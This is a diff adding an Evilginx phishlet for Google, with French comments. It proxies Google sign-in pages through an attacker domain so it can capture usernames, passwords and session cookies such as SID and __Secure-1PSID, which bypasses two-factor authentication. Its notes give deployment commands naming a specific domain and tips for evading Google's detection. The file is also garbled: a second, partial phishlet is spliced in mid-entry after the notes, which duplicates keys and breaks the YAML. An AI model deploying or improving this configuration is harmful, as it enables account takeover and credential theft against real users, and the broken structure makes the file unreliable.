@@ -1,0 +1,490 @@
+##########################################################
+# PHISHLET GOOGLE - VERSION CORRIGÉE 2025
+##########################################################
+# PHISHLET GOOGLE - VERSION AMÉLIORÉE
+# Objectif : améliorer la compatibilité et le rewriting des
+# assets pour réduire les détections "navigateur non sécurisé".
+# Testé pour Evilginx 3.x
+##########################################################
+
+name: "google"
+author: "@evilginx-pro"
+min_ver: "3.0.0"
+
+# ------------------------------------------------------------------
+# Proxy hosts : sous-domaines proxifiés. `phish_sub` définit le
+# sous-domaine proxifié sur votre domaine (eg. accounts.votredomaine.com)
+# ------------------------------------------------------------------
+proxy_hosts:
+  - phish_sub: "accounts"
+    orig_sub: "accounts"
+    domain: "google.com"
+    session: true
+    is_landing: true
+    auto_filter: true
+
+  - phish_sub: "myaccount"
+    orig_sub: "myaccount"
+    domain: "google.com"
+    session: true
+    is_landing: false
+    auto_filter: true
+
+  - phish_sub: "www"
+    orig_sub: "www"
+    domain: "google.com"
+    session: true
+    is_landing: false
+    auto_filter: true
+
+  - phish_sub: "ssl"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "gstatic"
+    orig_sub: "www"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "apis"
+    orig_sub: "apis"
+    domain: "google.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "content"
+    orig_sub: "content"
+    domain: "googleapis.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "lh3"
+    orig_sub: "lh3"
+    domain: "googleusercontent.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "recaptcha"
+    orig_sub: "www"
+    domain: "recaptcha.net"
+    session: false
+    is_landing: false
+
+# ------------------------------------------------------------------
+# Sub filters : règles de réécriture pour remplacer les URLs
+# et références vers google.com par votre hostname.
+# ------------------------------------------------------------------
+sub_filters:
+  # Remplacer les URLs complètes https://accounts.google.com -> https://{hostname}
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: 'https://accounts.google.com'
+    replace: 'https://{hostname}'
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  # Remplacer simple hostname accounts.google.com -> {hostname}
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: 'accounts.google.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/javascript", "application/json"]
+
+  # Ressources statiques gstatic
+  - triggers_on: "accounts.google.com"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    search: 'ssl.gstatic.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "gstatic"
+    domain: "gstatic.com"
+    search: 'www.gstatic.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "content"
+    domain: "googleapis.com"
+    search: 'content.googleapis.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "lh3"
+    domain: "googleusercontent.com"
+    search: 'lh3.googleusercontent.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "recaptcha"
+    domain: "recaptcha.net"
+    search: 'www.recaptcha.net'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/javascript"]
+
+# ------------------------------------------------------------------
+# Cookies / tokens à capturer - VERSION ÉTENDUE
+# Capture tous les cookies critiques Google pour maintenir la session
+# ------------------------------------------------------------------
+auth_tokens:
+  # Cookies principaux Google (.google.com)
+  - domain: ".google.com"
+    keys:
+      - "SID"           # Session ID principal
+      - "SSID"          # Secure Session ID
+      - "APISID"        # API Session ID
+      - "SAPISID"       # Secure API Session ID
+      - "HSID"          # Hash Session ID
+      - "LSID"          # Login Session ID
+      - "NID"           # Notification ID
+      - "SIDCC"         # Session ID Cross-domain Cookie
+      - "AEC"           # Analytics/Experience Cookie
+      - "1P_JAR"        # First-party JAR cookie
+      - "ACCOUNT_CHOOSER" # Sélecteur de compte
+      - "GAPS"          # Google Account Protection Service
+      - "__Secure-ENID" # Encrypted Network ID
+      - "DV"            # Device verification
+      - "CONSENT"       # Consentement RGPD
+
+  # Cookies sécurisés (__Secure-*)
+  - domain: ".google.com"
+    keys:
+      - "__Secure-1PSID"      # Secure First-party SID
+      - "__Secure-1PAPISID"   # Secure First-party API SID
+      - "__Secure-1PSIDTS"    # Secure First-party SID timestamp
+      - "__Secure-1PSIDCC"    # Secure First-party SID cross-domain
+      - "__Secure-3PSID"      # Secure Third-party SID
+      - "__Secure-3PAPISID"   # Secure Third-party API SID
+      - "__Secure-3PSIDTS"    # Secure Third-party SID timestamp
+      - "__Secure-3PSIDCC"    # Secure Third-party SID cross-domain
+
+  # Cookies spécifiques accounts.google.com
+  - domain: "accounts.google.com"
+    keys:
+      - "OSID"          # OAuth Session ID
+      - "__Host-GAPS"   # Host-specific GAPS
+      - "__Host-1PLSID" # Host First-party Login SID
+      - "__Host-3PLSID" # Host Third-party Login SID
+      - "GCLB"          # Google Cloud Load Balancer
+      - "GALX"          # Google Auth Login eXperience
+
+  # Cookies pour autres services Google
+  - domain: ".googleapis.com"
+    keys:
+      - "NID"
+      - "1P_JAR"
+      - "__Secure-ENID"
+
+  # Cookies YouTube (souvent liés au compte Google)
+  - domain: ".youtube.com"
+    keys:
+      - "SID"
+      - "SSID"
+      - "APISID"
+      - "SAPISID"
+      - "HSID"
+      - "LOGIN_INFO"
+      - "VISITOR_INFO1_LIVE"
+
+  # Cookies DoubleClick (Google Ads)
+  - domain: ".doubleclick.net"
+    keys:
+      - "IDE"
+      - "test_cookie"
+
+# ------------------------------------------------------------------
+# Capture des identifiants : clés POST communes
+# On ajoute des alias pour couvrir plusieurs noms de champs.
+# ------------------------------------------------------------------
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    - key: 'Email'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Passwd'
+      search: '(.*)'
+      type: 'post'
+
+# ------------------------------------------------------------------
+# Login / auth URLs – liste d'urls impliquées dans le flux
+# ------------------------------------------------------------------
+login:
+  domain: "accounts.google.com"
+  path: "/ServiceLogin"
+
+auth_urls:
+  - '/ServiceLogin'
+  - '/signin/v2/identifier'
+  - '/signin/v2/challenge'
+  - '/signin/v2/challenge/password'
+  - '/o/oauth2/auth'
+  - '/o/oauth2/v2/auth'
+
+# URLs de redirection/landing possibles
+landing_urls:
+  - '/myaccount'
+  - 'https://mail.google.com'
+  - 'https://drive.google.com'
+  - 'https://www.google.com'
+
+# Forcer lecture POST quand c'est utile
+force_post: true
+
+# Optionnel : indique que ce n'est pas un template
+is_template: false
+
+# NOTES:
+# - Après mise à jour, copiez ce fichier sur le VPS (ou remplacez
+#   l'actuel /root/.evilginx/phishlets/google.yaml), puis redémarrez
+#   Evilginx et utilisez :
+#     phishlets hostname google atlcunion.org
+#     phishlets enable google
+# - Si Google continue de détecter l'environnement, testez depuis
+#   un vrai navigateur mobile (user-agent natif) ou utilisez un
+#   autre phishlet (microsoft365) pour validation.
+    orig_sub: "signaler-pa"
+    domain: "clients6.google.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "content"
+    orig_sub: "content"
+    domain: "googleapis.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "people-pa"
+    orig_sub: "people-pa"
+    domain: "googleapis.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "fonts"
+    orig_sub: "fonts"
+    domain: "googleapis.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "lh3"
+    orig_sub: "lh3"
+    domain: "googleusercontent.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "ssl"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "www-gstatic"
+    orig_sub: "www"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "fonts-gstatic"
+    orig_sub: "fonts"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "recaptcha"
+    orig_sub: "www"
+    domain: "recaptcha.net"
+    session: false
+    is_landing: false
+
+sub_filters:
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: 'https://{hostname_regexp}accounts\.google\.com'
+    replace: "https://{hostname}"
+    mimes:
+      [
+        "text/html",
+        "application/json",
+        "application/javascript",
+        "application/x-javascript",
+      ]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: 'accounts\.google\.com'
+    replace: "{hostname}"
+    mimes:
+      [
+        "text/html",
+        "application/json",
+        "application/javascript",
+        "application/x-javascript",
+      ]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "myaccount"
+    domain: "google.com"
+    search: 'myaccount\.google\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "www"
+    domain: "google.com"
+    search: 'www\.google\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    search: 'ssl\.gstatic\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css", "application/javascript"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "www"
+    domain: "gstatic.com"
+    search: 'www\.gstatic\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css", "application/javascript"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "fonts"
+    domain: "gstatic.com"
+    search: 'fonts\.gstatic\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "content"
+    domain: "googleapis.com"
+    search: 'content\.googleapis\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "fonts"
+    domain: "googleapis.com"
+    search: 'fonts\.googleapis\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "lh3"
+    domain: "googleusercontent.com"
+    search: 'lh3\.googleusercontent\.com'
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+    redirect_only: false
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "www"
+    domain: "recaptcha.net"
+    search: 'www\.recaptcha\.net'
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+    redirect_only: false
+
+auth_tokens:
+  - domain: ".google.com"
+    keys:
+      - "SID"
+      - "SSID"
+      - "APISID"
+      - "SAPISID"
+      - "HSID"
+      - "LSID"
+      - "NID"
+      - "SIDCC"
+      - "AEC"
+      - "1P_JAR"
+      - "__Secure-ENID"
+      - "ACCOUNT_CHOOSER"
+      - "GAPS"
+
+  - domain: ".google.com"
+    keys:
+      - "__Secure-1PSID"
+      - "__Secure-1PAPISID"
+      - "__Secure-1PSIDTS"
+      - "__Secure-1PSIDCC"
+      - "__Secure-3PSID"
+      - "__Secure-3PAPISID"
+      - "__Secure-3PSIDTS"
+      - "__Secure-3PSIDCC"
+
+  - domain: "accounts.google.com"
+    keys:
+      - "OSID"
+      - "__Host-GAPS"
+      - "__Host-1PLSID"
+      - "__Host-3PLSID"
+
+credentials:
+  username:
+    key: "identifier"
+    search: "(.*)"
+    type: "post"
+
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+  custom:
+    - key: "Email"
+      search: "(.*)"
+      type: "post"
+    - key: "Passwd"
+      search: "(.*)"
+      type: "post"
+
+login:
+  domain: "accounts.google.com"
+  path: "/v3/signin/identifier"
+
+auth_urls:
+  - "/v3/signin/identifier"
+  - "/v3/signin/challenge"
+  - "/signin/v2/identifier"
+  - "/signin/v2/challenge"
+  - "/signin/v2/challenge/pwd"
+  - "/signin/v2/challenge/password"
+  - "/signin/v2/sl/pwd"
+  - "/_/signin/sl/challenge"
+  - "/ServiceLogin"
+  - "/ServiceLoginAuth"
+  - "/o/oauth2/auth"
+  - "/o/oauth2/v2/auth"
+
+force_post: true
+is_template: false
